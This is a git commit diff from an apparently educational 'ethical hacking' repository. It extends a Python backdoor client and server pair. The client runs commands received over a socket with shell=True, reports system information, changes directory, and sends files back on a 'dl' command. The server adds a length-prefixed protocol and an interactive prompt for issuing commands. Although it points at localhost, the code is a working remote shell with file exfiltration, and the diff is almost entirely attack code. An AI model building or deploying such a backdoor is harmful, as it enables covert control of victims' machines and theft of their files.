98cf54c7a699c60216c767ef441891b8e1454577
OPRTNL <46159142+OPRTNL@users.noreply.github.com>
2022-01-13 18:03:16 +0100

    init capture ecran

--- hackingethique/backdoor/backdoor_client.py
+++ hackingethique/backdoor/backdoor_client.py
@@ -2,6 +2,9 @@ import socket
 import time
 import os
 import subprocess
+import platform
+
+info_platform = platform.platform()
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
@@ -20,30 +23,49 @@ while True:
     else:
         print("connecté au serveur")
         break
-sent_data = "coucou"
-datarecues = "youpi"
+
 
 while True:
     commande_bi = s.recv(MAX_DATA_SIZE)
+    if not commande_bi:
+        break
     commande = commande_bi.decode()
     if commande == "exit":
         break
-    commande_split = commande.split(" ")
-    if len(commande_split) == 2 and commande_split[0] == "cd":
-        try:
-            os.chdir(commande_split[1])
-        except FileNotFoundError:
-            print("chemin incorrect")
-    else :
-        resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
-        response = resultat.stdout + resultat.stderr
-        if not response or len(response) == 0:
-            response = "ok"
-        s.sendall(response.encode())
-    if not commande:
-        break
 
+    if commande == "infos":
+        response = platform.platform() + " " + os.getcwd() + " => "
+        response = response.encode()
+    else:
+        commande_split = commande.split(" ")
+        if len(commande_split) == 2 and commande_split[0] == "cd":
+            try:
+                os.chdir(commande_split[1].strip("'"))
+                response = " "
+            except FileNotFoundError:
+                response = "chemin incorrect"
+            response = response.encode()
+        elif len(commande_split) == 2 and commande_split[0] == "dl":
+            try:
+                f = open(commande_split[1], "rb")
+            except FileNotFoundError:
+                response = " ".encode()
+            else:
+                response = f.read()
+                f.close()
+        else :
+            resultat = subprocess.run(commande, shell=True, capture_output=True, universal_newlines=True)
+            response = resultat.stdout + resultat.stderr
+            response = response.encode()
     
+            if not response or len(response) == 0:
+                response = "ok"
+
+    header = str(len(response)).zfill(13)
+    print("longueur de la réponse : ", header)
+    s.sendall(header.encode())
+    s.sendall(response)
+
 
 
 s.close()
--- hackingethique/backdoor/backdoor_serveur.py
+++ hackingethique/backdoor/backdoor_serveur.py
@@ -1,12 +1,70 @@
 #SOCKET RESEAU : SERVEUR
 
 import socket
-import time
+
 
 HOST_IP = "127.0.0.1"
 HOST_PORT = 32000
 MAX_DATA_SIZE = 1024
 
+
+def socket_receive_all_data(socket_p, data_len):
+    current_data_len = 0
+    total_data = None
+    # print("reception client : ", data_len)
+    while current_data_len < data_len:
+        chunk = data_len - current_data_len
+        if chunk > MAX_DATA_SIZE:
+            chunk = MAX_DATA_SIZE
+
+        data = socket_p.recv(chunk)
+        # print("Paquet : ", len(data))
+        if not data : return None
+
+        if not total_data: 
+            total_data = data 
+        else: 
+            total_data += data
+
+        current_data_len = len(total_data)
+        # print(" recu  : ", current_data_len, " / ", data_len)
+
+    return total_data
+
+def send_to_client_and_receive_all_data(connection_socket, commande = 'infos'):
+    dl_command = False
+
+    if commande == "exit":
+        return False
+    elif commande == "":
+        return True
+
+    commande_split = commande.split(" ")
+    if len(commande_split) > 1 and commande_split[0] == "dl":
+        dl_command = True
+
+    connection_socket.sendall(commande.encode())
+    header = socket_receive_all_data(connection_socket, 13)
+    header_len = int(header)
+
+    response_bi = socket_receive_all_data(connection_socket, header_len)
+
+    if not response_bi:
+        return False
+
+    if dl_command:
+        if len(response_bi) == 1 and response_bi == b" ":
+            response = "Erreur:  Le fichier " + commande_split[1] + " n'existe pas !"
+            
+        else:
+            f = open(commande_split[1],"wb")
+            f.write(response_bi)
+            f.close()
+            response = "Dl ok"
+    else:
+        response = response_bi.decode()
+
+    return response
 
 s = socket.socket()
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -18,21 +76,35 @@ print(f"en attente d'une connexion sur {HOST_IP}, port {HOST_PORT}...")
 connection_socket, client_adress = s.accept()
 print(f"connexion établie avec {client_adress}")
 
-sent_data = "coucou"
-datarecues = "youpi"
+resultat = True
 
-while True:
+while resultat :
+    infos = send_to_client_and_receive_all_data(connection_socket)
+    commande = input(client_adress[0] + " : " + str(client_adress[1]) + " " +infos)
+    resultat = send_to_client_and_receive_all_data(connection_socket, commande)
+    if resultat: print(resultat) 
+""""
     commande =  input("Commande : ") 
     if commande == "exit":
         break
     elif commande == "":
         continue
+    
     connection_socket.sendall(commande.encode())
-    response_bi = connection_socket.recv(MAX_DATA_SIZE)
+    header = socket_receive_all_data(connection_socket, 13)
+    header_len = int(header.decode())
+
+    response_bi = socket_receive_all_data(connection_socket, header_len)
+
     if not response_bi:
         break
+
+
     response = response_bi.decode()
+
+
     print(response)
+"""
 
 
 s.close()
